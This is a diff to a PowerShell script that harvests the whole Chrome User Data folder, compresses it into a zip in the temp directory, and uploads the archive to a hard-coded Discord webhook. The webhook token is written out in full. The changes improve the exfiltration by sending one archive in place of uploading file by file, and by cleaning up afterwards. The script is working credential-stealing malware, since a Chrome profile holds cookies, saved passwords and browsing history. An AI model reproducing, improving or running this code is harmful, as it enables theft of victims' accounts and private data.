@@ -1,5 +1,3 @@
-### Created by mrproxy
-
 # Define the Discord Webhook URL (no `=` at the start)
 $webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"
 
@@ -20,45 +18,73 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to upload a file to Discord via webhook
+# Function to create a zip file and return the path
+function Create-ZipFile {
+    param (
+        [string]$chromePath,
+        [string]$outputZip
+    )
+    
+    # Get all files from Chrome User Data folder (skip files that are in use)
+    $chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }
+    $filesToAdd = @()
+
+    foreach ($file in $chromeFiles) {
+        try {
+            # Check if the file is in use (locked by another process)
+            $null = [System.IO.File]::OpenRead($file.FullName)
+            $filesToAdd += $file.FullName
+        } catch {
+            Write-Host "Skipping file (in use): $($file.FullName)"
+        }
+    }
+
+    if ($filesToAdd.Count -eq 0) {
+        Send-DiscordMessage -message "No files to zip (all files are in use)."
+        exit
+    }
+
+    # Create a zip of the Chrome User Data using Compress-Archive
+    Compress-Archive -Path $filesToAdd -DestinationPath $outputZip
+    if ($LASTEXITCODE -ne 0) {
+        Send-DiscordMessage -message "Error creating zip file with Compress-Archive"
+        exit
+    }
+
+    return $outputZip
+}
+
+# Function for uploading files to Discord via webhook
 function Upload-FileToDiscord {
     param (
         [string]$filePath
     )
 
-    $fileName = [System.IO.Path]::GetFileName($filePath)
     $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $fileName = [System.IO.Path]::GetFileName($filePath)
 
-    $boundary = [System.Guid]::NewGuid().ToString()
+    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
-    
-    # Prepare the form data for the POST request
     $bodyLines = (
         "--$boundary",
         "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
         "Content-Type: application/octet-stream",
         $LF,
-        [System.Text.Encoding]::Default.GetString($fileBytes),
+        [System.Text.Encoding]::ASCII.GetString($fileBytes),
         "--$boundary--",
         $LF
     ) -join $LF
 
-    # Prepare the HTTP headers
     $headers = @{
         "Content-Type" = "multipart/form-data; boundary=$boundary"
     }
 
-    # Upload the file via the Discord Webhook
     try {
-        $response = Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $bodyLines
-        if ($response.status -ne "ok") {
-            Write-Host "Failed to upload file to Discord"
-            return $null
-        }
-        Write-Host "File uploaded successfully to Discord"
+        # Send the file to Discord via webhook
+        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
+        Write-Host "File uploaded successfully."
     } catch {
         Write-Host "Failed to upload file to Discord: $_"
-        return $null
     }
 }
 
@@ -69,21 +95,14 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
-# Get all files from the Chrome User Data folder (recursive)
-$chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }
+# Define the path for the zip file
+$outputZip = "$env:TEMP\chrome_data.zip"
 
-if ($chromeFiles.Count -eq 0) {
-    Send-DiscordMessage -message "No files found in Chrome User Data folder!"
-    exit
-}
+# Create the zip file with Chrome User Data
+$zipFile = Create-ZipFile -chromePath $chromePath -outputZip $outputZip
 
-# Iterate through each file and upload it to Discord
-foreach ($file in $chromeFiles) {
-    Upload-FileToDiscord -filePath $file.FullName
+# Upload the zip file to Discord
+Upload-FileToDiscord -filePath $zipFile
 
-    # Optionally, notify when each file is processed
-    Send-DiscordMessage -message "File uploaded: $($file.FullName)"
-}
-
-# Optionally, notify when all files are processed
-Send-DiscordMessage -message "All files processed."
+# Optionally, remove the zip file after uploading
+Remove-Item $zipFile
